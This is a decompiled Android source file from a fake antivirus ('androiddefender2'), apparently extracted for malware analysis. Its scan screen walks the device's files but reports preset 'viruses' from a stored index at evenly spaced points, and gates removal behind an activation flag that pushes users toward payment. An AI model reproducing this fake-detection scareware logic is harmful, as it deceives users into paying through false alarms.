package com.example.androiddefender2;

import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TableLayout;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;
import com.worker.androiddefender2.SystemFunctions;
import java.io.File;
import java.util.ArrayList;
import system.AppSingleton;
import system.ThreadControl;
import system.VirusObject;

public class ScanningActivity extends CustomActGroup {
  private boolean PauseScan = false;
  
  private boolean ScanApp;
  
  private boolean ScanSD;
  
  public Button btnByAndRemove;
  
  public Button btnRepeat;
  
  private getScanInfo loader = null;
  
  public ProgressBar progressBar;
  
  ThreadControl tControl = new ThreadControl();
  
  public TextView tvCurFile;
  
  public TextView tvFilesCount;
  
  public TextView tvProcentPr;
  
  public TextView txtFinalVirusView;
  
  public TextView txtStatusScan;
  
  public void addRow(String paramString) {
    TableLayout tableLayout = (TableLayout)findViewById(2131296328);
    TableRow tableRow = (TableRow)((LayoutInflater)getSystemService("layout_inflater")).inflate(2130903061, null);
    ImageView imageView = (ImageView)tableRow.findViewById(2131296369);
    TextView textView = (TextView)tableRow.findViewById(2131296370);
    if (!(AppSingleton.getInstance()).activaten) {
      imageView.setImageResource(2130837528);
      textView.setTextColor(Color.parseColor("#ff0000"));
      textView.setText(2131099723);
    } else {
      imageView.setImageResource(2130837557);
      textView.setTextColor(Color.parseColor("#78c90a"));
      textView.setText(2131099722);
    } 
    ((TextView)tableRow.getChildAt(1)).setText(paramString);
    tableLayout.addView((View)tableRow);
  }
  
  public void btnByAndRemove_Click(View paramView) {
    boolean bool = false;
    if ((AppSingleton.getInstance()).activaten) {
      Button button = (Button)findViewById(2131296332);
      if (this.PauseScan) {
        this.tControl.resume();
        button.setText(2131099729);
      } else {
        this.tControl.pause();
        button.setText(2131099728);
      } 
      if (!this.PauseScan)
        bool = true; 
      this.PauseScan = bool;
      return;
    } 
    if (this.loader == null || this.loader.getStatus().equals(AsyncTask.Status.FINISHED)) {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(4);
      return;
    } 
    Toast.makeText(getApplicationContext(), 2131099752, 0).show();
  }
  
  public void btnRepeat_Click(View paramView) {
    try {
      this.tControl.cancel();
      finishLastActivity();
      Intent intent = new Intent();
      this((Context)this, ScanActivity.class);
      startChildActivity("StartScan", intent, true);
    } catch (Exception exception) {
      Toast.makeText(getApplicationContext(), exception.getMessage(), 1).show();
    } 
  }
  
  public void onBackPressed() {
    if (this.loader == null || this.loader.getStatus().equals(AsyncTask.Status.FINISHED)) {
      super.onBackPressed();
      return;
    } 
    Toast.makeText(getApplicationContext(), 2131099752, 0).show();
  }
  
  public void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    RelativeLayout relativeLayout = (RelativeLayout)findViewById(2130903048);
    if (relativeLayout != null) {
      relativeLayout.invalidate();
      setContentView((View)relativeLayout);
    } else {
      setContentView(2130903048);
    } 
    try {
      Drawable drawable;
      this.progressBar = (ProgressBar)findViewById(2131296323);
      this.tvCurFile = (TextView)findViewById(2131296324);
      this.tvFilesCount = (TextView)findViewById(2131296330);
      this.tvProcentPr = (TextView)findViewById(2131296331);
      this.txtStatusScan = (TextView)findViewById(2131296294);
      this.txtFinalVirusView = (TextView)findViewById(2131296329);
      this.progressBar.setProgress(0);
      this.loader = null;
      Intent intent = getIntent();
      this.ScanApp = intent.getBooleanExtra("scanApplication", false);
      this.ScanSD = intent.getBooleanExtra("scanSDCard", false);
      this.btnByAndRemove = (Button)findViewById(2131296332);
      this.btnRepeat = (Button)findViewById(2131296333);
      TextView textView = (TextView)findViewById(2131296327);
      if (!(AppSingleton.getInstance()).activaten) {
        this.progressBar.setProgressDrawable(getResources().getDrawable(2130837566));
        textView.setVisibility(0);
        drawable = getApplicationContext().getResources().getDrawable(2130837557);
        this.btnByAndRemove.setCompoundDrawablesWithIntrinsicBounds(drawable, null, null, null);
        this.btnByAndRemove.setText(2131099698);
        this.btnRepeat.setText(2131099699);
        ((ViewGroup.MarginLayoutParams)((ImageView)findViewById(2131296326)).getLayoutParams()).setMargins(0, 0, 0, 25);
        drawable.invalidateSelf();
        return;
      } 
      this.progressBar.setProgressDrawable(getResources().getDrawable(2130837565));
      drawable.setVisibility(4);
      this.btnByAndRemove.setCompoundDrawablesWithIntrinsicBounds(null, null, null, null);
      this.btnByAndRemove.setText(2131099698);
      this.btnByAndRemove.setText(2131099729);
      this.btnRepeat.setText(2131099724);
      ((ViewGroup.MarginLayoutParams)((ImageView)findViewById(2131296326)).getLayoutParams()).setMargins(0, 0, 0, 15);
    } catch (Exception exception) {
      Toast.makeText(getApplicationContext(), exception.getMessage(), 1).show();
    } 
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu) {
    getMenuInflater().inflate(2131230726, paramMenu);
    return true;
  }
  
  public void startLoading() {
    if (this.loader == null || this.loader.getStatus().equals(AsyncTask.Status.FINISHED))
      try {
        (DefenderApplication.getInstance()).skaner_worker = true;
        if (!(AppSingleton.getInstance()).activaten) {
          this.btnByAndRemove.setEnabled(false);
          this.btnRepeat.setEnabled(false);
        } 
        getScanInfo getScanInfo1 = new getScanInfo();
        this(this);
        this.loader = getScanInfo1;
        File file = Environment.getRootDirectory();
        this.loader.execute((Object[])new File[] { file });
      } catch (Exception exception) {
        Toast.makeText((Context)this, exception.getMessage(), 0).show();
      }  
  }
  
  class getScanInfo extends AsyncTask<File, Integer, Void> {
    ArrayList<String> arlist = null;
    
    private int count_files = 0;
    
    private String cur_status;
    
    private int current_file = 0;
    
    private String file_name;
    
    private boolean prepare_count = false;
    
    private int progr = 0;
    
    private int step_memory = 0;
    
    private int virus_count_rand = 0;
    
    private int virus_current_index = 0;
    
    protected Void doInBackground(File... param1VarArgs) {
      try {
        if (this.count_files == 0) {
          this.prepare_count = true;
          this.cur_status = "���������� ������";
          this.count_files = getCountFiles(Environment.getRootDirectory());
          if (ScanningActivity.this.ScanSD) {
            int i = getCountFiles(Environment.getExternalStorageDirectory());
            this.count_files += i;
          } 
          this.prepare_count = false;
        } 
        if ((DefenderApplication.getInstance()).indexesVr != null && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
          this.virus_count_rand = (DefenderApplication.getInstance()).countViruses;
          this.step_memory = Math.round((this.count_files / this.virus_count_rand));
        } 
        this.cur_status = "������������ �������";
        getListFilesSDCard(Environment.getRootDirectory());
        if (ScanningActivity.this.ScanSD) {
          this.cur_status = "������������ SD �����";
          getListFilesSDCard(Environment.getExternalStorageDirectory());
        } 
      } catch (Exception exception) {
        Toast.makeText(ScanningActivity.this.getApplicationContext(), exception.toString(), 0).show();
      } 
      return null;
    }
    
    public int getCountFiles(File param1File) {
      // Byte code:
      //   0: aload_1
      //   1: ifnonnull -> 8
      //   4: iconst_0
      //   5: istore_2
      //   6: iload_2
      //   7: ireturn
      //   8: iconst_0
      //   9: istore_3
      //   10: aload_1
      //   11: invokevirtual listFiles : ()[Ljava/io/File;
      //   14: astore #4
      //   16: aload #4
      //   18: arraylength
      //   19: istore #5
      //   21: iconst_0
      //   22: istore #6
      //   24: iload_3
      //   25: istore_2
      //   26: iload #6
      //   28: iload #5
      //   30: if_icmpge -> 6
      //   33: aload #4
      //   35: iload #6
      //   37: aaload
      //   38: astore_1
      //   39: iload_3
      //   40: istore_2
      //   41: aload_1
      //   42: invokevirtual canRead : ()Z
      //   45: ifeq -> 101
      //   48: aload_1
      //   49: invokevirtual isDirectory : ()Z
      //   52: ifeq -> 130
      //   55: iload_3
      //   56: istore_2
      //   57: aload_1
      //   58: invokevirtual getAbsolutePath : ()Ljava/lang/String;
      //   61: ldc '.android_secure'
      //   63: invokevirtual endsWith : (Ljava/lang/String;)Z
      //   66: ifne -> 6
      //   69: aload_1
      //   70: invokevirtual getAbsolutePath : ()Ljava/lang/String;
      //   73: ldc 'DCIM'
      //   75: invokevirtual endsWith : (Ljava/lang/String;)Z
      //   78: ifeq -> 93
      //   81: iload_3
      //   82: istore #7
      //   84: iinc #6, 1
      //   87: iload #7
      //   89: istore_3
      //   90: goto -> 24
      //   93: iload_3
      //   94: aload_0
      //   95: aload_1
      //   96: invokevirtual getCountFiles : (Ljava/io/File;)I
      //   99: iadd
      //   100: istore_2
      //   101: aload_0
      //   102: getfield this$0 : Lcom/example/androiddefender2/ScanningActivity;
      //   105: getfield tControl : Lsystem/ThreadControl;
      //   108: invokevirtual waitIfPaused : ()V
      //   111: iload_2
      //   112: istore #7
      //   114: aload_0
      //   115: getfield this$0 : Lcom/example/androiddefender2/ScanningActivity;
      //   118: getfield tControl : Lsystem/ThreadControl;
      //   121: invokevirtual isCancelled : ()Z
      //   124: ifeq -> 84
      //   127: goto -> 6
      //   130: iload_3
      //   131: istore #7
      //   133: aload_1
      //   134: invokevirtual getAbsolutePath : ()Ljava/lang/String;
      //   137: ldc '.sbf'
      //   139: invokevirtual endsWith : (Ljava/lang/String;)Z
      //   142: ifne -> 84
      //   145: iload_3
      //   146: iconst_1
      //   147: iadd
      //   148: istore_2
      //   149: aload_0
      //   150: aload_1
      //   151: invokevirtual getName : ()Ljava/lang/String;
      //   154: invokevirtual toString : ()Ljava/lang/String;
      //   157: putfield file_name : Ljava/lang/String;
      //   160: aload_0
      //   161: iconst_1
      //   162: anewarray java/lang/Integer
      //   165: dup
      //   166: iconst_0
      //   167: iconst_0
      //   168: invokestatic valueOf : (I)Ljava/lang/Integer;
      //   171: aastore
      //   172: invokevirtual publishProgress : ([Ljava/lang/Object;)V
      //   175: goto -> 101
      //   178: astore_1
      //   179: aload_0
      //   180: getfield this$0 : Lcom/example/androiddefender2/ScanningActivity;
      //   183: invokevirtual getApplicationContext : ()Landroid/content/Context;
      //   186: aload_1
      //   187: invokevirtual toString : ()Ljava/lang/String;
      //   190: iconst_0
      //   191: invokestatic makeText : (Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
      //   194: invokevirtual show : ()V
      //   197: iconst_0
      //   198: istore_2
      //   199: goto -> 6
      // Exception table:
      //   from	to	target	type
      //   10	21	178	java/lang/Exception
      //   41	55	178	java/lang/Exception
      //   57	81	178	java/lang/Exception
      //   93	101	178	java/lang/Exception
      //   101	111	178	java/lang/Exception
      //   114	127	178	java/lang/Exception
      //   133	145	178	java/lang/Exception
      //   149	175	178	java/lang/Exception
    }
    
    public ArrayList<String> getListFilesSDCard(File param1File) {
      try {
        if (this.arlist == null) {
          ArrayList<String> arrayList = new ArrayList();
          this();
          this.arlist = arrayList;
        } 
        File[] arrayOfFile = param1File.listFiles();
        int i = arrayOfFile.length;
        for (byte b = 0;; b++) {
          if (b < i) {
            File file = arrayOfFile[b];
            if (file.canRead())
              if (file.isDirectory()) {
                boolean bool = file.getAbsolutePath().endsWith(".android_secure");
                if (bool)
                  return this.arlist; 
                if (file.getAbsolutePath().endsWith("DCIM"))
                  continue; 
                getListFilesSDCard(file);
              } else if (!file.getAbsolutePath().endsWith(".sbf")) {
                this.arlist.add(file.getAbsolutePath());
                double d = this.count_files / 100.0D;
                this.progr = (int)Math.ceil(this.arlist.size() / d);
                publishProgress((Object[])new Integer[] { Integer.valueOf(this.progr) });
                this.file_name = file.getName().toString();
                this.current_file++;
              } else {
                continue;
              }  
          } else {
            return this.arlist;
          } 
          ScanningActivity.this.tControl.waitIfPaused();
          if (ScanningActivity.this.tControl.isCancelled())
            return this.arlist; 
          continue;
        } 
      } catch (Exception exception) {
        Toast.makeText(ScanningActivity.this.getApplicationContext(), exception.toString(), 0).show();
      } 
      return this.arlist;
    }
    
    protected void onPostExecute(Void param1Void) {
      if (!(AppSingleton.getInstance()).activaten) {
        ScanningActivity.this.txtFinalVirusView.setText("������� �����: " + this.virus_count_rand + ". ��������� �����: 0");
      } else if ((DefenderApplication.getInstance()).indexesVr.size() > 0) {
        ScanningActivity.this.txtFinalVirusView.setText("������� �����: " + this.virus_count_rand + ". ��������� �����: " + this.virus_count_rand);
        if (this.progr >= 100) {
          AppSingleton.getInstance().getDB(ScanningActivity.this.getApplicationContext());
          (AppSingleton.getInstance()).mainDB.ExecuteSQLScript((AppSingleton.getInstance()).mainDB.getWritableDatabase(), "DELETE FROM viruses_index");
          (DefenderApplication.getInstance()).indexesVr = new ArrayList<Integer>();
          (DefenderApplication.getInstance()).countViruses = 0;
        } 
      } else {
        ScanningActivity.this.txtFinalVirusView.setText("������� �����: 0. ��������� �����: 0");
      } 
      ScanningActivity.this.btnByAndRemove.setEnabled(true);
      ScanningActivity.this.btnRepeat.setEnabled(true);
      (DefenderApplication.getInstance()).skaner_worker = false;
    }
    
    protected void onProgressUpdate(Integer... param1VarArgs) {
      try {
        int i = param1VarArgs[0].intValue();
        ScanningActivity.this.txtStatusScan.setText(this.cur_status);
        if (this.file_name != null) {
          String str;
          if (this.file_name.length() > 13) {
            StringBuilder stringBuilder = new StringBuilder();
            this();
            str = stringBuilder.append(this.file_name.substring(1, 5)).append("...").append(this.file_name.substring(this.file_name.length() - 5, this.file_name.length() - 1)).toString();
          } else {
            str = this.file_name;
          } 
          ScanningActivity.this.tvCurFile.setText(str);
        } 
        if (!this.prepare_count) {
          ScanningActivity.this.progressBar.setProgress(i);
          TextView textView1 = ScanningActivity.this.tvFilesCount;
          StringBuilder stringBuilder2 = new StringBuilder();
          this();
          textView1.setText(stringBuilder2.append(this.current_file).append("/").append(this.count_files).toString());
          TextView textView2 = ScanningActivity.this.tvProcentPr;
          StringBuilder stringBuilder1 = new StringBuilder();
          this();
          textView2.setText(stringBuilder1.append(i).append("%").toString());
          if ((DefenderApplication.getInstance()).indexesVr != null && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
            int j = Math.round((this.count_files / this.virus_count_rand));
            i = this.current_file;
            int k = this.step_memory;
            if (i >= k) {
              try {
                if ((DefenderApplication.getInstance()).indexesVr.size() > 0) {
                  VirusObject virusObject = SystemFunctions.getVirusByIndex(((Integer)(DefenderApplication.getInstance()).indexesVr.get(this.virus_current_index)).intValue() - 1);
                  ScanningActivity.this.addRow(virusObject.getName());
                  this.step_memory += j;
                } 
              } catch (Exception exception) {}
            } else {
              return;
            } 
          } else {
            return;
          } 
        } else {
          return;
        } 
        this.virus_current_index++;
      } catch (Exception exception) {
        Toast.makeText(ScanningActivity.this.getApplicationContext(), exception.toString(), 0).show();
      } 
    }
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/ScanningActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */